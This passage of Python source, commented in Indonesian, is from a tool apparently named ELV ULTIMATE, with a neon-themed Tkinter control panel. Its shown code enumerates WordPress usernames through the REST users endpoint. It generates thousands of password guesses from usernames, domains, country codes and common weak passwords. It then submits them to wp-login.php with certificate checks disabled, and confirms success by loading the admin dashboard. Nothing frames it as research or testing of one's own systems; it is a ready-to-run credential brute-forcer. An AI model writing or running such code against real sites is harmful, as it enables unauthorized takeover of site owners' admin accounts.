        """Extract domain name dari URL untuk generate smart password"""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.replace('www.', '').split('.')[0]
            domain = re.sub('[^a-zA-Z0-9]', '', domain)
            return domain.lower() if domain else 'admin'
        except:
            return 'admin'

    def analyze_domain(self, url):
        """Analisa domain secara mendalam: TLD, country code, dll"""
        domain_info = {'domain': '', 'tld': '', 'country': '', 'domain_parts': [], 'keywords': []}
        try:
            parsed = urlparse(url)
            netloc = parsed.netloc.replace('www.', '')
            parts = netloc.split('.')
            if parts:
                domain_info['domain'] = parts[0].lower()
                domain_info['tld'] = parts[-1].lower() if len(parts) > 1 else ''
                domain_info['domain_parts'] = [p.lower() for p in parts if p]
                domain_text = domain_info['domain']
                keywords = re.findall('[a-z]+|[0-9]+', domain_text)
                domain_info['keywords'] = [k for k in keywords if len(k) > 2]
                country_tlds = {'id': 'indonesia', 'jp': 'japan', 'cn': 'china', 'kr': 'korea', 'in': 'india', 'uk': 'uk', 'us': 'usa', 'au': 'australia', 'de': 'germany', 'fr': 'france', 'it': 'italy', 'es': 'spain', 'br': 'brazil', 'mx': 'mexico', 'ru': 'russia', 'sg': 'singapore'}
                if domain_info['tld'] in country_tlds:
                    domain_info['country'] = country_tlds[domain_info['tld']]
        except:
            pass
        return domain_info

    def extract_context_from_page(self, url, timeout=10):
        """Extract context/keywords - DISABLED untuk stabil (terlalu berat untuk laptop kentang)"""
        return {'keywords': [], 'company_name': '', 'brand_name': '', 'industry': '', 'language': 'en'}
        '\n        context_data = {\n            \'keywords\': [],\n            \'company_name\': \'\',\n            \'brand_name\': \'\',\n            \'industry\': \'\',\n            \'language\': \'en\'\n        }\n        \n        try:\n            response = self.session.get(url, timeout=timeout, verify=False, allow_redirects=True)\n            if response.status_code == 200:\n                text = response.text.lower()\n                html = response.text\n                \n                # Extract dari title\n                title_match = re.search(r\'<title[^>]*>([^<]+)</title>\', html, re.IGNORECASE)\n                if title_match:\n                    title = title_match.group(1)\n                    words = re.findall(r\'\x08[a-z]{3,}\x08\', title.lower())\n                    context_data[\'keywords\'].extend(words[:8])\n                    \n                    # Extract company/brand name (biasanya di awal title)\n                    title_parts = title.split(\'|\')[0].split(\'-\')[0].strip()\n                    if len(title_parts) < 30:\n                        context_data[\'company_name\'] = title_parts.lower()\n                \n                # Extract dari meta description\n                meta_match = re.search(r\'<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']+)["\']\', html, re.IGNORECASE)\n                if meta_match:\n                    desc = meta_match.group(1).lower()\n                    words = re.findall(r\'\x08[a-z]{3,}\x08\', desc)\n                    context_data[\'keywords\'].extend(words[:5])\n                \n                # Extract dari h1, h2 tags\n                h1_matches = re.findall(r\'<h1[^>]*>([^<]+)</h1>\', html, re.IGNORECASE)\n                for h1 in h1_matches[:3]:\n                    words = re.findall(r\'\x08[a-z]{3,}\x08\', h1.lower())\n                    context_data[\'keywords\'].extend(words[:3])\n                \n                # Extract dari meta keywords\n                meta_keywords = re.search(r\'<meta[^>]*name=["\']keywords["\'][^>]*content=["\']([^"\']+)["\']\', html, re.IGNORECASE)\n                if meta_keywords:\n                    keywords = meta_keywords.group(1).lower().split(\',\')\n                    context_data[\'keywords\'].extend([k.strip() for k in keywords[:5]])\n                \n                # Detect language dari content\n                common_words = {\n                    \'en\': [\'the\', \'and\', \'for\', \'are\', \'with\', \'this\', \'that\'],\n                    \'id\': [\'dan\', \'yang\', \'dengan\', \'untuk\', \'pada\', \'dari\'],\n                    \'es\': [\'el\', \'la\', \'de\', \'que\', \'y\', \'en\', \'un\'],\n                    \'fr\': [\'le\', \'de\', \'et\', \'à\', \'un\', \'il\', \'être\'],\n                    \'de\': [\'der\', \'die\', \'und\', \'in\', \'den\', \'von\', \'zu\'],\n                    \'ja\': [\'の\', \'に\', \'は\', \'を\', \'た\', \'が\', \'で\'],\n                    \'zh\': [\'的\', \'了\', \'在\', \'是\', \'我\', \'有\', \'和\']\n                }\n                \n                text_sample = text[:1000] if text and len(text) > 1000 else (text if text else \'\')\n                for lang, words in common_words.items():\n                    count = sum(1 for w in words if w in text_sample)\n                    if count >= 3:\n                        context_data[\'language\'] = lang\n                        break\n                \n                # Detect industry dari keywords\n                industry_keywords = {\n                    \'tech\': [\'technology\', \'software\', \'digital\', \'tech\', \'app\', \'system\'],\n                    \'business\': [\'business\', \'company\', \'corporate\', \'enterprise\', \'commercial\'],\n                    \'news\': [\'news\', \'media\', \'press\', \'journal\', \'article\', \'report\'],\n                    \'blog\': [\'blog\', \'post\', \'article\', \'write\', \'author\'],\n                    \'shop\': [\'shop\', \'store\', \'buy\', \'cart\', \'product\', \'price\'],\n                    \'education\': [\'education\', \'school\', \'university\', \'learn\', \'course\', \'student\']\n                }\n                \n                for industry, keywords in industry_keywords.items():\n                    if any(kw in text_sample for kw in keywords):\n                        context_data[\'industry\'] = industry\n                        break\n        except:\n            pass\n        \n        # Remove duplicates dan limit\n        context_data[\'keywords\'] = list(set(context_data[\'keywords\']))[:15]\n        return context_data\n        '

    def get_usernames_from_wpjson(self, base_url, timeout=10):
        """Mengambil username dari wp-json/wp/v2/users - PRIORITAS PERTAMA"""
        usernames = []
        base_url = base_url.replace('/wp-login.php', '').rstrip('/')
        endpoints = [f'{base_url}/wp-json/wp/v2/users', f'{base_url}/?rest_route=/wp/v2/users', f'{base_url}/wp-json/wp/v2/users?per_page=100']
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, timeout=timeout, allow_redirects=False, verify=False)
                if response.status_code == 200:
                    try:
                        users = response.json()
                        if isinstance(users, list):
                            for user in users:
                                if isinstance(user, dict):
                                    if 'slug' in user and user['slug']:
                                        usernames.append(user['slug'])
                                    elif 'name' in user and user['name']:
                                        name = user['name'].lower().replace(' ', '').replace('-', '')
                                        if name and len(name) > 2:
                                            usernames.append(name)
                                    elif 'id' in user:
                                        user_id = str(user['id'])
                                        if user_id:
                                            usernames.append(user_id)
                        elif isinstance(users, dict):
                            if 'slug' in users and users['slug']:
                                usernames.append(users['slug'])
                            elif 'name' in users and users['name']:
                                name = users['name'].lower().replace(' ', '').replace('-', '')
                                if name and len(name) > 2:
                                    usernames.append(name)
                        if usernames:
                            unique_usernames = list(set([u for u in usernames if u and len(str(u)) > 0]))
                            if unique_usernames:
                                return unique_usernames
                    except (json.JSONDecodeError, KeyError) as e:
                        continue
                    except Exception:
                        continue
                elif response.status_code == 401:
                    continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
        return []

    def generate_smart_usernames(self, url):
        """Generate smart usernames berdasarkan domain dan konteks"""
        usernames = []
        domain = self.extract_domain_name(url)
        context = self.extract_context_from_page(url)
        usernames.extend([domain, domain + 'admin', 'admin' + domain, domain[:4] if len(domain) > 4 else domain, domain + '1', domain + '123'])
        for keyword in context[:3]:
            if keyword and len(keyword) > 2:
                usernames.extend([keyword, keyword + 'admin', 'admin' + keyword, keyword + '1'])
        usernames.extend(['admin', 'administrator', 'root', 'user', 'test', 'demo', 'guest'])
        return list(set([u for u in usernames if u and len(u) > 1]))[:20]

    def generate_smart_passwords(self, username, url=None, failed_passwords=None, context_data=None, domain_info=None):
        """Generate 500+ smart password dengan analisa mendalam"""
        passwords = []
        failed_passwords = failed_passwords or []
        if url and (not domain_info):
            domain_info = self.analyze_domain(url)
        domain = domain_info.get('domain', '') if domain_info else self.extract_domain_name(url) if url else None
        country = domain_info.get('country', '') if domain_info else ''
        if url and (not context_data):
            context_data = self.extract_context_from_page(url)
        context_keywords = context_data.get('keywords', []) if context_data else []
        company_name = context_data.get('company_name', '') if context_data else ''
        industry = context_data.get('industry', '') if context_data else ''
        language = context_data.get('language', 'en') if context_data else 'en'
        base_patterns = [username, username.upper(), username.capitalize(), username.lower(), username.title()]
        numbers = ['', '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890', '2020', '2021', '2022', '2023', '2024', '2025', '2019', '2018', '2017', '2016', '2015', '2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009', '2010', '01', '001', '0001', '111', '1111', '11111', '0000', '00000', '000000', '0', '00', '000', '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '100', '101', '102', '200', '201', '202', '300', '400', '500', '600', '700', '800', '900', '1000', '2000', '3000', '5000', '10000', '11', '22', '33', '44', '55', '66', '77', '88', '99', '110', '220', '330', '440', '550', '660', '770', '880', '990', '1122', '2233', '3344', '4455', '5566', '6677', '7788', '8899', '123', '321', '456', '654', '789', '987', '147', '258', '369', '741', '852', '963', '135', '246', '357', '468', '579', '753', '864', '975']
        symbols = ['', '!', '@', '#', '$', '%', '&', '*', '+', '=', '-', '_', '.', ',', ':', ';', '!@#', '@123', '!123', '#123', '$123', '123!', '123@', '123#', '123$', '123%', '!@#$', '@#$%', '#$%^', '$%^&', '%^&*', '^&*()', '&*()_', '*()_+', '()_+-', '!@#$%', '@#$%^', '#$%^&', '$%^&*', '%^&*()', '^&*()_', '&*()_+', '!@', '@#', '#$', '$%', '%^', '^&', '&*', '*(', '!!', '@@', '##', '$$', '%%', '&&', '**', '++', '==', '!@#123', '@#$123', '#$%123', '$%^123', '%^&123', '123!@#', '123@#$', '123#$%', '123$%^', '123%^&']
        for base in base_patterns:
            for num in numbers[:15]:
                for sym in symbols[:10]:
                    if base and num and sym:
                        passwords.append(base + num + sym)
                        passwords.append(base + sym + num)
                        passwords.append(num + base + sym)
                    elif base and num:
                        passwords.append(base + num)
                    elif base and sym:
                        passwords.append(base + sym)
        if domain:
            domain_variants = [domain, domain.upper(), domain.capitalize(), domain.title()]
            for d in domain_variants:
                for num in numbers[:10]:
                    for sym in symbols[:5]:
                        passwords.extend([d + num, d + sym, d + num + sym, username + d, d + username, username + d + num, d + username + num])
        for keyword in context_keywords[:10]:
            if keyword and len(keyword) > 2:
                for num in numbers[:8]:
                    for sym in symbols[:3]:
                        passwords.extend([keyword + num, keyword + sym, username + keyword, keyword + username, keyword + username + num])
        if company_name:
            company_clean = re.sub('[^a-zA-Z0-9]', '', company_name.lower())
            if company_clean:
                for num in numbers[:10]:
                    passwords.extend([company_clean + num, company_clean + '123', username + company_clean, company_clean + username])
        if country:
            country_short = country[:4] if len(country) > 4 else country
            passwords.extend([country_short + '123', country_short + username, username + country_short, country_short + '2024'])
        if industry:
            industry_keywords = {'tech': ['tech', 'it', 'dev', 'code', 'sys'], 'business': ['biz', 'corp', 'com', 'enterprise'], 'news': ['news', 'media', 'press'], 'blog': ['blog', 'post', 'write'], 'shop': ['shop', 'store', 'buy', 'sell'], 'education': ['edu', 'learn', 'study', 'school']}
            if industry in industry_keywords:
                for kw in industry_keywords[industry]:
                    passwords.extend([kw + '123', username + kw, kw + username])
        lang_passwords = {'id': ['indonesia', 'jakarta', 'bandung', 'surabaya', '12345', 'admin123'], 'ja': ['japan', 'tokyo', 'osaka', '12345', 'admin123'], 'zh': ['china', 'beijing', 'shanghai', '12345', 'admin123'], 'es': ['españa', 'madrid', 'barcelona', '12345', 'admin123'], 'fr': ['france', 'paris', 'lyon', '12345', 'admin123'], 'de': ['deutschland', 'berlin', 'munich', '12345', 'admin123']}
        if language in lang_passwords:
            passwords.extend(lang_passwords[language])
        common_passwords = ['admin', 'password', '123456', 'admin123', 'password123', 'Admin', 'Password', 'Admin123', 'Password123', 'admin@123', 'password@123', '12345678', 'qwerty', 'abc123', 'welcome', 'monkey', '1234567890', 'letmein', 'trustno1', 'dragon', 'baseball', 'iloveyou', 'master', 'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow', '123123', '654321', 'superman', 'qazwsx', 'michael', 'football', 'welcome123', 'admin2024', 'password2024', 'root', 'root123', 'test', 'test123', 'demo', 'demo123', 'guest', 'guest123', 'user', 'user123', 'administrator', 'administrator123', '1234', '12345', '123456', '1234567', '12345678', '123456789', 'qwerty123', 'abc123', 'password1', 'password12', 'password123', 'admin1', 'admin12', 'admin123', 'admin1234', 'admin12345', 'P@ssw0rd', 'P@ssword', 'Admin@123', 'Password@123', 'welcome1', 'welcome12', 'welcome123', 'welcome2024', 'password', 'Password', 'PASSWORD', 'pass', 'Pass', 'PASS', 'pass123', 'Pass123', 'PASS123', 'pass@123', 'Pass@123', 'admin', 'Admin', 'ADMIN', 'adm', 'Adm', 'ADM', 'admin1', 'Admin1', 'ADMIN1', 'admin!', 'Admin!', 'ADMIN!', 'root', 'Root', 'ROOT', 'root123', 'Root123', 'ROOT123', '123456', '1234567', '12345678', '123456789', '1234567890', 'qwerty', 'Qwerty', 'QWERTY', 'qwerty123', 'Qwerty123', 'abc123', 'ABC123', 'Abc123', 'abc@123', 'ABC@123', 'welcome', 'Welcome', 'WELCOME', 'welcome123', 'Welcome123', 'test', 'Test', 'TEST', 'test123', 'Test123', 'TEST123', 'demo', 'Demo', 'DEMO', 'demo123', 'Demo123', 'DEMO123', 'user', 'User', 'USER', 'user123', 'User123', 'USER123', 'guest', 'Guest', 'GUEST', 'guest123', 'Guest123', 'GUEST123', 'password1', 'Password1', 'PASSWORD1', 'password12', 'Password12', 'admin2024', 'Admin2024', 'ADMIN2024', 'admin2023', 'Admin2023', 'password2024', 'Password2024', 'PASSWORD2024', 'password2023', 'P@ssw0rd', 'p@ssw0rd', 'P@SSW0RD', 'P@ssword', 'p@ssword', 'Admin@123', 'admin@123', 'ADMIN@123', 'Admin@2024', 'admin@2024', 'Password@123', 'password@123', 'PASSWORD@123', 'Password@2024', 'welcome@123', 'Welcome@123', 'WELCOME@123', 'welcome@2024', '123456!', '123456@', '123456#', '123456$', '123456%', 'admin!@#', 'Admin!@#', 'ADMIN!@#', 'admin@#$', 'Admin@#$', 'password!@#', 'Password!@#', 'PASSWORD!@#', 'password@#$', 'qwerty!', 'Qwerty!', 'QWERTY!', 'qwerty@', 'Qwerty@', 'abc123!', 'ABC123!', 'Abc123!', 'abc123@', 'ABC123@', 'welcome!', 'Welcome!', 'WELCOME!', 'welcome@', 'Welcome@', 'test!', 'Test!', 'TEST!', 'test@', 'Test@', 'TEST@', 'demo!', 'Demo!', 'DEMO!', 'demo@', 'Demo@', 'DEMO@', 'user!', 'User!', 'USER!', 'user@', 'User@', 'USER@', 'guest!', 'Guest!', 'GUEST!', 'guest@', 'Guest@', 'GUEST@', 'root!', 'Root!', 'ROOT!', 'root@', 'Root@', 'ROOT@', 'admin123!', 'Admin123!', 'ADMIN123!', 'admin123@', 'Admin123@', 'password123!', 'Password123!', 'PASSWORD123!', 'password123@', 'welcome123!', 'Welcome123!', 'WELCOME123!', 'welcome123@', 'test123!', 'Test123!', 'TEST123!', 'test123@', 'Test123@', 'demo123!', 'Demo123!', 'DEMO123!', 'demo123@', 'Demo123@', 'user123!', 'User123!', 'USER123!', 'user123@', 'User123@', 'guest123!', 'Guest123!', 'GUEST123!', 'guest123@', 'Guest123@', 'root123!', 'Root123!', 'ROOT123!', 'root123@', 'Root123@', 'admin2024!', 'Admin2024!', 'ADMIN2024!', 'admin2024@', 'Admin2024@', 'password2024!', 'Password2024!', 'PASSWORD2024!', 'password2024@', '123456789', '1234567890', '0987654321', '987654321', 'qwertyuiop', 'QWERTYUIOP', 'asdfghjkl', 'ASDFGHJKL', 'zxcvbnm', 'ZXCVBNM', 'qwerty123', 'QWERTY123', 'asdf123', 'ASDF123', 'zxcv123', 'ZXCV123', 'qwe123', 'QWE123', 'asd123', 'ASD123', 'zxc123', 'ZXC123', 'qwerty!@#', 'QWERTY!@#', 'asdf!@#', 'ASDF!@#', 'zxcv!@#', 'ZXCV!@#', 'qwe!@#', 'QWE!@#', 'adminadmin', 'AdminAdmin', 'ADMINADMIN', 'adminadmin123', 'passwordpassword', 'PasswordPassword', 'PASSWORDPASSWORD', 'rootroot', 'RootRoot', 'ROOTROOT', 'rootroot123', 'testtest', 'TestTest', 'TESTTEST', 'testtest123', 'useruser', 'UserUser', 'USERUSER', 'useruser123', 'guestguest', 'GuestGuest', 'GUESTGUEST', 'guestguest123', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5', 'Admin1', 'Admin2', 'Admin3', 'Admin4', 'Admin5', 'password1', 'password2', 'password3', 'password4', 'password5', 'Password1', 'Password2', 'Password3', 'Password4', 'Password5', 'root1', 'root2', 'root3', 'root4', 'root5', 'Root1', 'Root2', 'Root3', 'Root4', 'Root5', 'test1', 'test2', 'test3', 'test4', 'test5', 'Test1', 'Test2', 'Test3', 'Test4', 'Test5', 'user1', 'user2', 'user3', 'user4', 'user5', 'User1', 'User2', 'User3', 'User4', 'User5', 'guest1', 'guest2', 'guest3', 'guest4', 'guest5', 'Guest1', 'Guest2', 'Guest3', 'Guest4', 'Guest5', 'admin01', 'admin02', 'admin03', 'admin04', 'admin05', 'Admin01', 'Admin02', 'Admin03', 'Admin04', 'Admin05', 'password01', 'password02', 'password03', 'password04', 'password05', 'Password01', 'Password02', 'Password03', 'Password04', 'Password05', 'root01', 'root02', 'root03', 'root04', 'root05', 'Root01', 'Root02', 'Root03', 'Root04', 'Root05', 'test01', 'test02', 'test03', 'test04', 'test05', 'Test01', 'Test02', 'Test03', 'Test04', 'Test05', 'user01', 'user02', 'user03', 'user04', 'user05', 'User01', 'User02', 'User03', 'User04', 'User05', 'guest01', 'guest02', 'guest03', 'guest04', 'guest05', 'Guest01', 'Guest02', 'Guest03', 'Guest04', 'Guest05', 'admin001', 'admin002', 'admin003', 'admin004', 'admin005', 'Admin001', 'Admin002', 'Admin003', 'Admin004', 'Admin005', 'password001', 'password002', 'password003', 'password004', 'password005', 'Password001', 'Password002', 'Password003', 'Password004', 'Password005', 'root001', 'root002', 'root003', 'root004', 'root005', 'Root001', 'Root002', 'Root003', 'Root004', 'Root005', 'test001', 'test002', 'test003', 'test004', 'test005', 'Test001', 'Test002', 'Test003', 'Test004', 'Test005', 'user001', 'user002', 'user003', 'user004', 'user005', 'User001', 'User002', 'User003', 'User004', 'User005', 'guest001', 'guest002', 'guest003', 'guest004', 'guest005', 'Guest001', 'Guest002', 'Guest003', 'Guest004', 'Guest005', 'admin0001', 'admin0002', 'admin0003', 'admin0004', 'admin0005', 'Admin0001', 'Admin0002', 'Admin0003', 'Admin0004', 'Admin0005', 'password0001', 'password0002', 'password0003', 'password0004', 'password0005', 'Password0001', 'Password0002', 'Password0003', 'Password0004', 'Password0005', 'root0001', 'root0002', 'root0003', 'root0004', 'root0005', 'Root0001', 'Root0002', 'Root0003', 'Root0004', 'Root0005', 'test0001', 'test0002', 'test0003', 'test0004', 'test0005', 'Test0001', 'Test0002', 'Test0003', 'Test0004', 'Test0005', 'user0001', 'user0002', 'user0003', 'user0004', 'user0005', 'User0001', 'User0002', 'User0003', 'User0004', 'User0005', 'guest0001', 'guest0002', 'guest0003', 'guest0004', 'guest0005', 'Guest0001', 'Guest0002', 'Guest0003', 'Guest0004', 'Guest0005']
        passwords.extend(common_passwords)
        if failed_passwords:
            patterns = {}
            for fpwd in failed_passwords[:20]:
                if re.search('\\d+', fpwd):
                    patterns['has_number'] = True
                if re.search('[!@#$%&*]', fpwd):
                    patterns['has_symbol'] = True
                if fpwd.isupper():
                    patterns['is_upper'] = True
                if fpwd.islower():
                    patterns['is_lower'] = True
            if not patterns.get('has_number'):
                passwords.extend([username + str(i) for i in range(100, 1000, 50)])
            if not patterns.get('has_symbol'):
                for sym in ['!', '@', '#', '$']:
                    passwords.extend([username + sym, username + sym + '123'])
        username_variants = [username, username.upper(), username.capitalize(), username.lower(), username.title(), username[::-1], username + username, username[:len(username) // 2] + username[len(username) // 2:].upper()]
        for variant in username_variants[:5]:
            if variant:
                for num in ['123', '1234', '2024', '2023', '2022']:
                    for sym in ['!', '@', '#', '$']:
                        passwords.extend([variant + num, variant + sym, variant + num + sym, num + variant + sym])
        keyboard_patterns = ['qwerty', 'QWERTY', 'Qwerty', 'qwerty123', 'QWERTY123', 'Qwerty123', 'qwerty!', 'QWERTY!', 'Qwerty!', 'qwerty@', 'QWERTY@', 'Qwerty@', 'qwerty!@#', 'QWERTY!@#', 'Qwerty!@#', 'qwerty@#$', 'QWERTY@#$', 'asdfgh', 'ASDFGH', 'Asdfgh', 'asdfgh123', 'ASDFGH123', 'Asdfgh123', 'asdfgh!', 'ASDFGH!', 'Asdfgh!', 'asdfgh@', 'ASDFGH@', 'Asdfgh@', 'asdfgh!@#', 'ASDFGH!@#', 'Asdfgh!@#', 'asdfgh@#$', 'ASDFGH@#$', 'zxcvbn', 'ZXCVBN', 'Zxcvbn', 'zxcvbn123', 'ZXCVBN123', 'Zxcvbn123', 'zxcvbn!', 'ZXCVBN!', 'Zxcvbn!', 'zxcvbn@', 'ZXCVBN@', 'Zxcvbn@', 'zxcvbn!@#', 'ZXCVBN!@#', 'Zxcvbn!@#', 'zxcvbn@#$', 'ZXCVBN@#$', 'qwertyuiop', 'QWERTYUIOP', 'Qwertyuiop', 'qwertyuiop123', 'asdfghjkl', 'ASDFGHJKL', 'Asdfghjkl', 'asdfghjkl123', 'zxcvbnm', 'ZXCVBNM', 'Zxcvbnm', 'zxcvbnm123', 'qazwsx', 'QAZWSX', 'Qazwsx', 'qazwsx123', 'QAZWSX123', 'qazwsx!', 'QAZWSX!', 'Qazwsx!', 'qazwsx@', 'QAZWSX@', 'qazwsx!@#', 'QAZWSX!@#', 'Qazwsx!@#', 'qazwsx@#$', '1qaz2wsx', '1QAZ2WSX', '1Qaz2Wsx', '1qaz2wsx!', '1QAZ2WSX!', '1qaz2wsx@', '1QAZ2WSX@', '1qaz2wsx!@#', '1QAZ2WSX!@#', 'qwe123', 'QWE123', 'Qwe123', 'qwe123!', 'QWE123!', 'qwe123@', 'asd123', 'ASD123', 'Asd123', 'asd123!', 'ASD123!', 'asd123@', 'zxc123', 'ZXC123', 'Zxc123', 'zxc123!', 'ZXC123!', 'zxc123@', 'qwe!@#', 'QWE!@#', 'Qwe!@#', 'asd!@#', 'ASD!@#', 'Asd!@#', 'zxc!@#', 'ZXC!@#', 'Zxc!@#', 'qwe@#$', 'QWE@#$', 'Qwe@#$', 'asd@#$', 'ASD@#$', 'Asd@#$', 'zxc@#$', 'ZXC@#$', 'Zxc@#$']
        passwords.extend(keyboard_patterns)
        years = ['2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023', '2024', '2025']
        for year in years:
            passwords.extend([username + year, year + username, username + year + '!', year + username + '!', username + year + '@', year + username + '@', username + year + '#', year + username + '#', 'admin' + year, 'Admin' + year, 'ADMIN' + year, 'password' + year, 'Password' + year, 'root' + year, 'Root' + year, 'ROOT' + year, 'test' + year, 'Test' + year, 'user' + year, 'User' + year, 'USER' + year, 'guest' + year, 'Guest' + year, 'admin' + year + '!', 'Admin' + year + '!', 'password' + year + '!', 'Password' + year + '!', 'root' + year + '!', 'Root' + year + '!', 'test' + year + '!', 'Test' + year + '!', 'user' + year + '!', 'User' + year + '!', 'guest' + year + '!', 'Guest' + year + '!', 'admin' + year + '@', 'Admin' + year + '@', 'password' + year + '@', 'Password' + year + '@', 'root' + year + '@', 'Root' + year + '@', 'test' + year + '@', 'Test' + year + '@', 'user' + year + '@', 'User' + year + '@', 'guest' + year + '@', 'Guest' + year + '@'])
        for i in range(0, 1000, 10):
            num_str = str(i).zfill(3)
            passwords.extend([username + num_str, num_str + username, username + num_str + '!', num_str + username + '!', username + num_str + '@', num_str + username + '@', username + num_str + '#', num_str + username + '#', 'admin' + num_str, 'Admin' + num_str, 'password' + num_str, 'Password' + num_str, 'root' + num_str, 'Root' + num_str, 'test' + num_str, 'Test' + num_str])
        special_chars = ['!', '@', '#', '$', '%', '&', '*', '+', '=', '-', '_', '.', ',', ':', ';']
        for char in special_chars:
            passwords.extend([username + char, char + username, username + char + '123', char + username + '123', username + char + char, char + char + username, username + char + '2024', char + username + '2024', 'admin' + char, 'Admin' + char, 'ADMIN' + char, 'password' + char, 'Password' + char, 'root' + char, 'Root' + char, 'ROOT' + char, 'test' + char, 'Test' + char, 'user' + char, 'User' + char, 'USER' + char, 'guest' + char, 'Guest' + char, 'admin' + char + '123', 'Admin' + char + '123', 'password' + char + '123', 'Password' + char + '123', 'root' + char + '123', 'Root' + char + '123', 'test' + char + '123', 'Test' + char + '123', 'user' + char + '123', 'User' + char + '123', 'guest' + char + '123', 'Guest' + char + '123', 'admin' + char + '2024', 'Admin' + char + '2024', 'password' + char + '2024', 'Password' + char + '2024', 'root' + char + '2024', 'Root' + char + '2024', 'test' + char + '2024', 'Test' + char + '2024', 'user' + char + '2024', 'User' + char + '2024', 'guest' + char + '2024', 'Guest' + char + '2024'])
        multi_chars = ['!@', '@#', '#$', '$%', '%^', '^&', '&*', '*(', '!@#', '@#$', '#$%', '$%^', '%^&', '^&*', '&*(', '!@#$', '@#$%', '#$%^', '$%^&', '%^&*', '^&*(', '!@#$%', '@#$%^', '#$%^&', '$%^&*', '%^&*(']
        for multi in multi_chars:
            passwords.extend([username + multi, multi + username, username + multi + '123', multi + username + '123', 'admin' + multi, 'Admin' + multi, 'password' + multi, 'Password' + multi, 'root' + multi, 'Root' + multi, 'test' + multi, 'Test' + multi, 'user' + multi, 'User' + multi, 'guest' + multi, 'Guest' + multi, 'admin' + multi + '123', 'Admin' + multi + '123', 'password' + multi + '123', 'Password' + multi + '123', 'root' + multi + '123', 'Root' + multi + '123', 'test' + multi + '123', 'Test' + multi + '123', 'user' + multi + '123', 'User' + multi + '123', 'guest' + multi + '123', 'Guest' + multi + '123'])
        unique_passwords = []
        seen = set()
        for pwd in passwords:
            if pwd and pwd not in seen and (len(pwd) >= 3) and (len(pwd) <= 50):
                unique_passwords.append(pwd)
                seen.add(pwd)
        return unique_passwords

    def generate_passwords(self, username, url=None, failed_passwords=None, context_data=None, domain_info=None):
        """Generate password list berdasarkan username - menggunakan smart generation"""
        return self.generate_smart_passwords(username, url, failed_passwords, context_data, domain_info)

    def test_login(self, url, username, password, timeout=10):
        """Test login"""
        login_url = urljoin(url, '/wp-login.php')
        try:
            login_session = requests.Session()
            login_session.headers.update(DEFAULT_HEADERS)
            if self.session.proxies:
                login_session.proxies = self.session.proxies
            get_response = login_session.get(login_url, timeout=timeout, allow_redirects=False, verify=False)
            if get_response.status_code not in [200, 302, 301]:
                return (False, 'Login page tidak dapat diakses')
            login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': urljoin(url, '/wp-admin/'), 'testcookie': '1'}
            post_response = login_session.post(login_url, data=login_data, timeout=timeout, allow_redirects=False, verify=False)
            response_text = post_response.text.lower() if post_response.text else ''
            error_indicators = ['incorrect username or password', 'invalid username', 'the password you entered', 'lost your password', 'login_error', 'error', 'username or email']
            has_error = any((indicator in response_text for indicator in error_indicators)) if response_text else False
            if has_error:
                return (False, 'Username atau password salah')
            cookies = login_session.cookies
            has_wordpress_logged_in = any(('wordpress_logged_in' in str(cookie.name).lower() for cookie in cookies))
            has_wordpress_cookie = any(('wordpress_' in str(cookie.name).lower() for cookie in cookies))
            if not (has_wordpress_logged_in or has_wordpress_cookie):
                return (False, 'Login gagal - tidak ada session cookie')
            location = post_response.headers.get('Location', '').lower()
            if 'wp-login.php' in location:
                return (False, 'Login gagal - redirect ke login page')
            if post_response.status_code in [302, 301] or has_wordpress_logged_in:
                try:
                    admin_url = urljoin(url, '/wp-admin/')
                    admin_response = login_session.get(admin_url, timeout=timeout, allow_redirects=False, verify=False)
                    if 'wp-login.php' in admin_response.url.lower():
                        return (False, 'Login gagal - redirect ke login')
                    if admin_response.status_code == 200:
                        admin_text = admin_response.text.lower() if admin_response.text else ''
                        dashboard_indicators = ['wp-admin', 'dashboard', 'wordpress', 'admin-bar']
                        found_dashboard = sum((1 for indicator in dashboard_indicators if indicator in admin_text))
                        has_login_form = 'wp-login.php' in admin_text or (admin_text and len(admin_text) > 0 and ('log in' in admin_text[:min(1000, len(admin_text))]))
                        if found_dashboard >= 2 and (not has_login_form):
                            return (True, 'Login berhasil!')
                        if has_wordpress_logged_in and 'wp-login.php' not in admin_response.url:
                            return (True, 'Login berhasil!')
                except:
                    pass
            if has_wordpress_logged_in and ('wp-admin' in location or '/wp-admin/' in location):
                return (True, 'Login berhasil!')
            return (False, 'Login gagal')
        except requests.exceptions.Timeout:
            return (False, 'Timeout')
        except requests.exceptions.ConnectionError:
            return (False, 'Connection error')
        except Exception as e:
            return (False, f'Error: {str(e)[:50]}')

class ControlPanel:

    def __init__(self, root):
        self.root = root
        self.root.title('⚡ ELV-ULTIMATE — CYBERPUNK NEON 2077 ⚡')
        self.root.geometry('1400x800')
        self.colors = {'bg': '#000000', 'fg': '#00ff41', 'fg_cyan': '#00ffff', 'fg_yellow': '#ffff00', 'fg_red': '#ff0040', 'fg_green': '#00ff41', 'fg_purple': '#ff00ff', 'entry_bg': '#0a0a0a', 'entry_fg': '#00ff41', 'button_bg': '#0d0d0d', 'button_fg': '#00ff41', 'select_bg': '#1a1a1a', 'text_bg': '#000000', 'border': '#00ff41'}
        self.current_tab = None
        self.tabs = {}
        if not self.check_login():
            return
        self.show_loading_screen()
        self.setup_control_panel()
        self.root.protocol('WM_DELETE_WINDOW', self.on_closing)

    def check_login(self):
        login_window = tk.Toplevel(self.root)
        login_window.title('ELV ULTIMATE - Login')
        login_window.geometry('400x250')
        login_window.configure(bg=BG_DARK)
        login_window.resizable(False, False)
        login_window.transient(self.root)
        login_window.grab_set()
        login_window.update_idletasks()
        x = login_window.winfo_screenwidth() // 2 - 400 // 2
        y = login_window.winfo_screenheight() // 2 - 250 // 2
        login_window.geometry(f'400x250+{x}+{y}')
        title_label = tk.Label(login_window, text='ELV ULTIMATE', font=('Courier', 20, 'bold'), fg=CYAN_NEON, bg=BG_DARK)
        title_label.pack(pady=20)
